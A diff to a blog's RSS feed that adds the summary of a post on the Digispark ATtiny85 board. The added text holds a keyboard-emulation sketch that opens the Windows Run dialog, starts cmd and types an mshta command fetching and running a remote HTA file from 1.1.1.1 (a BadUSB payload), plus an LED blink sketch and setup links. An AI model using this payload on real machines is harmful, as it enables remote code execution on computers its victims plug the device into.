@@ -13,7 +13,9 @@
       <link>https://xhstormr.github.io/blog/posts/digispark/</link>
       <pubDate>Sat, 16 Nov 2019 16:15:32 +0800</pubDate>
       <guid>https://xhstormr.github.io/blog/posts/digispark/</guid>
-      <description></description>
+      <description>Updated on 2019-11-16
+基于 Attiny85 单片机
+Code #include &amp;#34;DigiKeyboard.h&amp;#34; #define KEY_CAPSLOCK 57 void setup() { DigiKeyboard.delay(1000); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); DigiKeyboard.delay(500); DigiKeyboard.println(&amp;#34;cmd&amp;#34;); DigiKeyboard.delay(500); DigiKeyboard.println(&amp;#34;mshta http://1.1.1.1/main.hta &amp;amp; exit&amp;#34;); } void loop() { } void setup() { pinMode(1, OUTPUT); } void loop() { digitalWrite(1, HIGH); delay(1000); digitalWrite(1, LOW); delay(1000); } Install https://github.com/arduino/Arduino https://github.com/digistump/arduino-boards-index https://github.com/digistump/DigistumpArduino/releases/latest Reference https://github.com/toxydose/Duckyspark Digispark Example DigiMouse.h DigiKeyboard.h HID Usage Tables </description>
     </item>
   </channel>
 </rss>
